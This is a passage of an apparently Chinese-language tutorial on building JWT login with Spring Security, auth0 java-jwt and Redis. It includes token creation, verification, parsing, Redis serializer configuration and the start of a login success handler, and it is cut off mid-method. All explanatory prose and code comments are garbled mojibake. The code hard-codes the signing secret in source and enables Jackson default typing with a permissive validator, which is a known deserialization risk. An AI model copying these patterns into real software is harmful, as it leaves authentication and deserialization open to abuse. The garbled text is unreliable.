<h3 data-id="heading-8">2.1 ç”Ÿæˆjwt</h3>
<p>é¦–å…ˆæˆ‘ä»¬å…ˆå¼•å…¥ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.auth0<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>java-jwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ç„¶åæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª<code>JWTUtil</code>å·¥å…·ç±»ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªç”Ÿæˆ<code>JWT</code>çš„æ–¹æ³•<code>creatToken</code>ï¼Œè¿™ä¸ªä»£ç å¾ˆç®€å•ä¹Ÿå¾ˆå›ºå®šï¼Œä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬åªéœ€è¦é…ç½®<code>SECRET</code>ä¸å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è´Ÿè½½ä¸­çš„ä¿¡æ¯å°±å¯ä»¥ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JWTUtil</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SECRET</span> <span class="hljs-operator">=</span> <span class="hljs-string">"6a5w5*;d5656z/54aw1d2*z55cc"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">LoginUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginUser</span>();
        user.setName(<span class="hljs-string">"zhangsan"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> creatToken(user);
        System.out.println(token);
    }

    <span class="hljs-comment">/**
     * ç”ŸæˆJWT
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">creatToken</span><span class="hljs-params">(LoginUser user)</span>{
        Map&lt;String, Object&gt; header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        header.put(<span class="hljs-string">"alg"</span>, <span class="hljs-string">"HS256"</span>);
        header.put(<span class="hljs-string">"typ"</span>, <span class="hljs-string">"JWT"</span>);
        <span class="hljs-keyword">return</span> JWT.create()
                .withHeader(header)  <span class="hljs-comment">// è®¾ç½®å¤´éƒ¨ä¿¡æ¯</span>
                .withClaim(<span class="hljs-string">"name"</span>, user.getName()) <span class="hljs-comment">// æ·»åŠ è´Ÿè½½</span>
                .sign(Algorithm.HMAC256(SECRET)); <span class="hljs-comment">// è®¾ç½®ç­¾å</span>
    }
}
</code></pre>
<p>æˆ‘ä»¬è¿˜å†™äº†ä¸ªmainæ–¹æ³•æ‰“å°ä¸€ä¸‹jwtï¼š<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiemhhbmdzYW4ifQ.AmjB3ghyybghULaEqkkNJiaMtZ-Zlqb3U8i0ZLrW2v4</code></p>
<h3 data-id="heading-9">2.2 éªŒè¯jwt</h3>
<p>æˆ‘ä»¬ä½¿ç”¨<code>JWTVerifier</code>å¯¹è±¡ä¸­çš„<code>.verify</code>æ–¹æ³•æ¥éªŒè¯<code>jwt</code>æ˜¯å¦æ­£ç¡®ä¸”æ²¡è¢«ç¯¡æ”¹è¿‡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JWTUtil</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SECRET</span> <span class="hljs-operator">=</span> <span class="hljs-string">"6a5w5*;d5656z/54aw1d2*z55cc"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">LoginUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginUser</span>();
        user.setName(<span class="hljs-string">"zhangsan"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> creatToken(user);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">verify</span> <span class="hljs-operator">=</span> verify(token);
        System.out.println(<span class="hljs-string">"æ— æ”¹å˜éªŒè¯:"</span>+verify);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">verify2</span> <span class="hljs-operator">=</span> verify(token+<span class="hljs-number">123</span>);
        System.out.println(<span class="hljs-string">"æœ‰æ”¹å˜éªŒè¯:"</span>+verify2);
    }

    <span class="hljs-comment">/**
     * ç”ŸæˆJWT
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">creatToken</span><span class="hljs-params">(LoginUser user)</span>{
        Map&lt;String, Object&gt; header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        header.put(<span class="hljs-string">"alg"</span>, <span class="hljs-string">"HS256"</span>);
        header.put(<span class="hljs-string">"typ"</span>, <span class="hljs-string">"JWT"</span>);
        <span class="hljs-keyword">return</span> JWT.create()
                .withHeader(header)  <span class="hljs-comment">// è®¾ç½®å¤´éƒ¨ä¿¡æ¯</span>
                .withClaim(<span class="hljs-string">"name"</span>, user.getName()) <span class="hljs-comment">// æ·»åŠ è´Ÿè½½</span>
                .sign(Algorithm.HMAC256(SECRET)); <span class="hljs-comment">// è®¾ç½®ç­¾å</span>
    }

    <span class="hljs-comment">/**
     * éªŒè¯JWT
     */</span>
    <span class="hljs-meta">@SuppressWarnings("CallToPrintStackTrace")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(String token)</span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä½¿ç”¨ç§˜é’¥åˆ›å»ºéªŒè¯å™¨</span>
            <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwtVerifier</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(SECRET)).build();
            <span class="hljs-comment">// éªŒè¯JWTå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™éªŒè¯æˆåŠŸ</span>
            jwtVerifier.verify(token);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p>ç»“æœå¦‚ä¸‹ï¼Œæˆ‘ä»¬çœ‹åˆ°å¦‚æœæ”¹å˜tokenå®ƒä¼šæŠ›å¼‚å¸¸å‡ºæ¥</p>
<pre><code class="hljs language-text" lang="text">æ— æ”¹å˜éªŒè¯:true
æœ‰æ”¹å˜éªŒè¯:false
com.auth0.jwt.exceptions.SignatureVerificationException: The Token's Signature resulted invalid when verified using the Algorithm: HmacSHA256
	at com.auth0.jwt.algorithms.HMACAlgorithm.verify(HMACAlgorithm.java:57)
	at com.auth0.jwt.JWTVerifier.verify(JWTVerifier.java:463)
	at com.auth0.jwt.JWTVerifier.verify(JWTVerifier.java:445)
	at com.example.util.JWTUtil.verify(JWTUtil.java:46)
	at com.example.util.JWTUtil.main(JWTUtil.java:20)
</code></pre>
<h3 data-id="heading-10">2.3 è§£æjwt</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JWTUtil</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SECRET</span> <span class="hljs-operator">=</span> <span class="hljs-string">"6a5w5*;d5656z/54aw1d2*z55cc"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">LoginUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoginUser</span>();
        user.setName(<span class="hljs-string">"zhangsan"</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> creatToken(user);
        <span class="hljs-comment">// è§£æ</span>
        System.out.println(getPayload(token));
    }

    <span class="hljs-comment">/**
     * ç”ŸæˆJWT
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">creatToken</span><span class="hljs-params">(LoginUser user)</span>{
        Map&lt;String, Object&gt; header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        header.put(<span class="hljs-string">"alg"</span>, <span class="hljs-string">"HS256"</span>);
        header.put(<span class="hljs-string">"typ"</span>, <span class="hljs-string">"JWT"</span>);
        <span class="hljs-keyword">return</span> JWT.create()
                .withHeader(header)  <span class="hljs-comment">// è®¾ç½®å¤´éƒ¨ä¿¡æ¯</span>
                .withClaim(<span class="hljs-string">"name"</span>, user.getName()) <span class="hljs-comment">// æ·»åŠ è´Ÿè½½</span>
                .sign(Algorithm.HMAC256(SECRET)); <span class="hljs-comment">// è®¾ç½®ç­¾å</span>
    }
    <span class="hljs-comment">/**
     * è·å–JWTä¸­çš„è´Ÿè½½ï¼ˆè§£æjwtï¼‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPayload</span><span class="hljs-params">(String token)</span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä½¿ç”¨ç§˜é’¥åˆ›å»ºéªŒè¯å™¨</span>
            <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwtVerifier</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(SECRET)).build();
            <span class="hljs-type">DecodedJWT</span> <span class="hljs-variable">decodedJWT</span> <span class="hljs-operator">=</span> jwtVerifier.verify(token);
            <span class="hljs-type">Claim</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> decodedJWT.getClaim(<span class="hljs-string">"name"</span>);
            <span class="hljs-keyword">return</span> name.asString();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
        }
    }
    <span class="hljs-comment">/**
     * éªŒè¯JWT
     */</span>
    <span class="hljs-meta">@SuppressWarnings("CallToPrintStackTrace")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(String token)</span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä½¿ç”¨ç§˜é’¥åˆ›å»ºéªŒè¯å™¨</span>
            <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwtVerifier</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(SECRET)).build();
            <span class="hljs-comment">// éªŒè¯JWTå¯¹è±¡ï¼Œå¦‚æœæ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œåˆ™éªŒè¯æˆåŠŸ</span>
            jwtVerifier.verify(token);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
}
</code></pre>
<p>çœ‹è¾“å‡ºï¼Œä¸€ç‚¹é—®é¢˜æ²¡æœ‰ï¼Œè‡³æ­¤ä¸€ä¸ªç®€å•çš„jwtç”Ÿæˆæ¡ˆä¾‹å°±ç®—æ˜¯æˆåŠŸäº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21d456ad6e014db28d84c85e51c421ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=j2uE5h1NYXMAmIgTjam0p0oPO9I%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-11">ä¸‰ã€å­˜å‚¨JTW</h2>
<p>æˆ‘ä»¬å…ˆçœ‹ä¸‹é¢å›¾ç‰‡ï¼Œå®ƒç®€å•çš„å±•ç¤ºäº†æˆ‘ä»¬jwtçš„ç”Ÿæˆä¸å­˜å‚¨è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°†åŸºäºæ­¤æ¥å®Œæˆæˆ‘ä»¬çš„ä»£ç ç¼–å†™ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a4919d86fe394593b5d840c219f370d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yqg5rSb5pav:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769655956&amp;x-signature=ZyK2eC2m5zdU%2FJNobkEduJsTgeI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-12">3.1 é…ç½®redis</h3>
<p>é¦–å…ˆæˆ‘ä»¬éœ€è¦å…ˆå‡†å¤‡ä¸€ä¸‹redisçš„ç¯å¢ƒï¼Œè¿™å—æ˜¯ä¸€ä¸ªå¤§çŸ¥è¯†ç‚¹æ‰€ä»¥è‚¯å®šå¹¶ä¸èƒ½è¯¦ç»†çš„è®²ï¼Œå…·ä½“å¦‚ä½•ä¸‹è½½å¦‚ä½•é…ç½®è¯·ç§»æ­¥åˆ°å…¶ä»–è¯¦ç»†è®²redisçš„æ–‡ç« </p>
<ol>
<li>å‡†å¤‡ä¾èµ–</li>
</ol>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<ol start="2">
<li>ä¿®æ”¹é…ç½®</li>
</ol>
<pre><code class="hljs language-yml" lang="yml"><span class="hljs-attr">data:</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-string">(æ”¹æˆä½ è‡ªå·±çš„)</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
    <span class="hljs-attr">database:</span> <span class="hljs-number">1</span>
    <span class="hljs-attr">timeout:</span> <span class="hljs-string">2000ms</span>
    <span class="hljs-attr">lettuce:</span>
      <span class="hljs-attr">pool:</span>
        <span class="hljs-attr">max-active:</span> <span class="hljs-number">8</span>
        <span class="hljs-attr">max-idle:</span> <span class="hljs-number">8</span>
        <span class="hljs-attr">min-idle:</span> <span class="hljs-number">0</span>
        <span class="hljs-attr">max-wait:</span> <span class="hljs-string">-1ms</span>
</code></pre>
<ol start="3">
<li>å‡†å¤‡RedisConfig</li>
</ol>
<p>è¿™æ˜¯ä¸€ä¸ªå›ºå®šä»£ç ï¼Œç”¨äºç»™rediså­˜å‚¨åºåˆ—åŒ–ç”¨çš„ï¼Œå¦åˆ™å­˜åˆ°åº“é‡Œé¢æ˜¯ä¹±ç ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisConfig</span> {

    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RedisTemplate&lt;String, Object&gt; <span class="hljs-title function_">redisTemplate</span><span class="hljs-params">(RedisConnectionFactory factory)</span> {
        RedisTemplate&lt;String, Object&gt; template = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RedisTemplate</span>&lt;&gt;();
        template.setConnectionFactory(factory);

        <span class="hljs-comment">// ä½¿ç”¨Jacksonåºåˆ—åŒ–Value</span>
        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">om</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.activateDefaultTyping(LaissezFaireSubTypeValidator.instance,
                ObjectMapper.DefaultTyping.NON_FINAL);

        <span class="hljs-type">GenericJackson2JsonRedisSerializer</span> <span class="hljs-variable">serializer</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericJackson2JsonRedisSerializer</span>(om);

        <span class="hljs-comment">// Keyä½¿ç”¨Stringåºåˆ—åŒ–</span>
        template.setKeySerializer(RedisSerializer.string());
        template.setHashKeySerializer(RedisSerializer.string());

        <span class="hljs-comment">// Valueä½¿ç”¨JSONåºåˆ—åŒ–</span>
        template.setValueSerializer(serializer);
        template.setHashValueSerializer(serializer);

        template.afterPropertiesSet();
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<h3 data-id="heading-13">3.2 Constantå¸¸é‡æ¥å£</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Constant</span> {
    <span class="hljs-comment">// JWTç§˜é’¥</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">SECRET</span> <span class="hljs-operator">=</span> <span class="hljs-string">"6a5w5*;d5656z/54aw1d2*z55cc"</span>;
    <span class="hljs-comment">// redisçš„keyçš„å‘½åè§„èŒƒ:é¡¹ç›®å:æ¨¡å—å:åŠŸèƒ½å[:å”¯ä¸€ä¸šåŠ¡å‚æ•°]</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">REDIS_TOKEN_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"security:user:login"</span>;
    <span class="hljs-comment">// ç™»å½•æ¥å£</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">LOGIN_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/login"</span>;
    <span class="hljs-comment">// ç™»å‡ºæ¥å£</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">LOGOUT_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">"/logout"</span>;
    <span class="hljs-comment">// åç«¯è¯·æ±‚å¤´ä¸­tokençš„åç§°</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">HEADER_TOKEN_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">"token"</span>;
}
</code></pre>
<h3 data-id="heading-14">3.3 JWTUtil</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * JWTå·¥å…·ç±»ï¼Œç”¨äºç”Ÿæˆã€è§£æå’ŒéªŒè¯JWTä»¤ç‰Œ
 * 
 * JWT (JSON Web Token) æ˜¯ä¸€ç§å¼€æ”¾æ ‡å‡†(RFC 7519)ï¼Œç”¨äºåœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´å®‰å…¨åœ°ä¼ é€’å£°æ˜ã€‚
 * JWTé€šå¸¸ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šHeader(å¤´éƒ¨)ã€Payload(è½½è·)ã€Signature(ç­¾å)
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JWTUtil</span> {
    
    <span class="hljs-comment">/**
     * ç”ŸæˆJWTä»¤ç‰Œ
     * <span class="hljs-doctag">@param</span> user ç”¨æˆ·ä¿¡æ¯å¯¹è±¡ï¼ŒåŒ…å«ç”¨æˆ·èº«ä»½ç›¸å…³æ•°æ®
     * <span class="hljs-doctag">@return</span> åŠ å¯†åçš„JWTä»¤ç‰Œå­—ç¬¦ä¸²
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">creatToken</span><span class="hljs-params">(LoginUser user)</span> {
        <span class="hljs-comment">// åˆ›å»ºJWTå¤´éƒ¨ä¿¡æ¯</span>
        Map&lt;String, Object&gt; header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        header.put(<span class="hljs-string">"alg"</span>, <span class="hljs-string">"HS256"</span>); <span class="hljs-comment">// æŒ‡å®šç­¾åç®—æ³•</span>
        header.put(<span class="hljs-string">"typ"</span>, <span class="hljs-string">"JWT"</span>);   <span class="hljs-comment">// æŒ‡å®šä»¤ç‰Œç±»å‹</span>
        
        <span class="hljs-comment">// ç”Ÿæˆä»¤ç‰Œ</span>
        <span class="hljs-keyword">return</span> JWT.create()
                .withHeader(header)                                    <span class="hljs-comment">// è®¾ç½®å¤´éƒ¨ä¿¡æ¯</span>
                .withClaim(<span class="hljs-string">"loginUser"</span>, JSONUtil.toJsonStr(user))      <span class="hljs-comment">// è®¾ç½®ç”¨æˆ·ä¿¡æ¯è½½è·</span>
                .withIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>())                             <span class="hljs-comment">// è®¾ç½®ç­¾å‘æ—¶é—´</span>
                .withExpiresAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>)) <span class="hljs-comment">// è®¾ç½®è¿‡æœŸæ—¶é—´ä¸º24å°æ—¶</span>
                .sign(Algorithm.HMAC256(Constant.SECRET));             <span class="hljs-comment">// ä½¿ç”¨æŒ‡å®šå¯†é’¥è¿›è¡Œç­¾å</span>
    }
    
    <span class="hljs-comment">/**
     * ä»JWTä»¤ç‰Œä¸­è·å–è½½è·ä¿¡æ¯
     * 
     * <span class="hljs-doctag">@param</span> token JWTä»¤ç‰Œå­—ç¬¦ä¸²
     * <span class="hljs-doctag">@return</span> å­˜å‚¨åœ¨ä»¤ç‰Œä¸­çš„ç”¨æˆ·ä¿¡æ¯JSONå­—ç¬¦ä¸²
     * <span class="hljs-doctag">@throws</span> RuntimeException å½“ä»¤ç‰Œæ— æ•ˆæˆ–è§£æå¤±è´¥æ—¶æŠ›å‡ºå¼‚å¸¸
     */</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPayload</span><span class="hljs-params">(String token)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä½¿ç”¨å¯†é’¥åˆ›å»ºéªŒè¯å™¨</span>
            <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwtVerifier</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(Constant.SECRET)).build();
            <span class="hljs-comment">// éªŒè¯å¹¶è§£ç JWTä»¤ç‰Œ</span>
            <span class="hljs-type">DecodedJWT</span> <span class="hljs-variable">decodedJWT</span> <span class="hljs-operator">=</span> jwtVerifier.verify(token);
            <span class="hljs-comment">// è·å–ç”¨æˆ·ä¿¡æ¯è½½è·</span>
            <span class="hljs-type">Claim</span> <span class="hljs-variable">loginUser</span> <span class="hljs-operator">=</span> decodedJWT.getClaim(<span class="hljs-string">"loginUser"</span>);
            <span class="hljs-keyword">return</span> loginUser.asString();
        } <span class="hljs-keyword">catch</span> (JWTVerificationException e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"JWTè§£æå¤±è´¥"</span>, e);
        }
    }
    
    <span class="hljs-comment">/**
     * éªŒè¯JWTä»¤ç‰Œçš„æœ‰æ•ˆæ€§
     * 
     * <span class="hljs-doctag">@param</span> token JWTä»¤ç‰Œå­—ç¬¦ä¸²
     * <span class="hljs-doctag">@return</span> å¦‚æœä»¤ç‰Œæœ‰æ•ˆè¿”å›trueï¼Œå¦åˆ™è¿”å›false
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verify</span><span class="hljs-params">(String token)</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä½¿ç”¨å¯†é’¥åˆ›å»ºéªŒè¯å™¨</span>
            <span class="hljs-type">JWTVerifier</span> <span class="hljs-variable">jwtVerifier</span> <span class="hljs-operator">=</span> JWT.require(Algorithm.HMAC256(Constant.SECRET)).build();
            <span class="hljs-comment">// éªŒè¯JWTä»¤ç‰Œï¼Œå¦‚æœéªŒè¯å¤±è´¥ä¼šæŠ›å‡ºå¼‚å¸¸</span>
            jwtVerifier.verify(token);
            <span class="hljs-comment">// å¦‚æœæ²¡æœ‰æŠ›å‡ºå¼‚å¸¸ï¼Œè¯´æ˜éªŒè¯æˆåŠŸ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        } <span class="hljs-keyword">catch</span> (JWTVerificationException | IllegalArgumentException e) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
    }
}
</code></pre>
<h3 data-id="heading-15">3.4 ç™»å½•å†™å…¥æµç¨‹</h3>
<p>æˆ‘ä»¬ä¹‹å‰å­¦ä¹ è¿‡ç™»å½•æˆåŠŸåçš„handleï¼Œé‚£ä¹ˆç”Ÿæˆjwtä»¤ç‰Œå’Œå†™å…¥redisçš„é€»è¾‘å†™åœ¨è¿™ä¸ªhandleé‡Œé¢æ­£å¥½ï¼Œä¸‹é¢çœ‹ä»£ç ï¼Œè¿™ä¸ªä»£ç æ˜¯è®¤è¯æˆåŠŸåè°ƒç”¨çš„æ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¼šåœ¨ç”¨æˆ·æˆåŠŸç™»å½•åè¢«è°ƒç”¨ï¼Œæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>ç”ŸæˆJWTä»¤ç‰Œ</li>
<li>å°†ä»¤ç‰Œå­˜å‚¨åˆ°Redisä¸­ï¼ˆç”¨äºåç»­çš„ä»¤ç‰ŒéªŒè¯ï¼‰</li>
<li>æ„å»ºå¹¶è¿”å›æˆåŠŸå“åº”ç»™å®¢æˆ·ç«¯</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è‡ªå®šä¹‰ç™»å½•æˆåŠŸå¤„ç†å™¨
 * å½“ç”¨æˆ·è®¤è¯æˆåŠŸåï¼Œæ­¤å¤„ç†å™¨ä¼šç”ŸæˆJWTä»¤ç‰Œï¼Œå°†å…¶ä¿å­˜åˆ°Redisä¸­ï¼Œ
 * å¹¶å‘å®¢æˆ·ç«¯è¿”å›åŒ…å«ä»¤ç‰Œçš„æˆåŠŸå“åº”ã€‚
 * å®ç°äº†Spring Securityçš„AuthenticationSuccessHandleræ¥å£ã€‚
 * è¯·å¼•å…¥hutool-allè¿™ä¸ªä¾èµ–
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyAuthenticationSuccessHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AuthenticationSuccessHandler</span> {

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> JWTUtil jwtUtil;
    
    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;

    <span class="hljs-comment">/**
     * è®¤è¯æˆåŠŸåè°ƒç”¨çš„æ–¹æ³•
     * <span class="hljs-doctag">@param</span> request HTTPè¯·æ±‚å¯¹è±¡ï¼Œæä¾›å®¢æˆ·ç«¯è¯·æ±‚çš„è¯·æ±‚ä¿¡æ¯
     * <span class="hljs-doctag">@param</span> response HTTPå“åº”å¯¹è±¡ï¼Œç”¨äºå‘å®¢æˆ·ç«¯å‘é€å“åº”
     * <span class="hljs-doctag">@param</span> authentication åŒ…å«è®¤è¯ä¿¡æ¯çš„å¯¹è±¡ï¼ŒåŒ…å«å·²è®¤è¯çš„ç”¨æˆ·ä¿¡æ¯
     * <span class="hljs-doctag">@throws</span> IOException å½“å†™å…¥å“åº”æ—¶å‘ç”ŸIOé”™è¯¯
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAuthenticationSuccess</span><span class="hljs-params">(HttpServletRequest request, 
                                      HttpServletResponse response, 
                                      Authentication authentication)</span> <span class="hljs-keyword">throws</span> IOException {
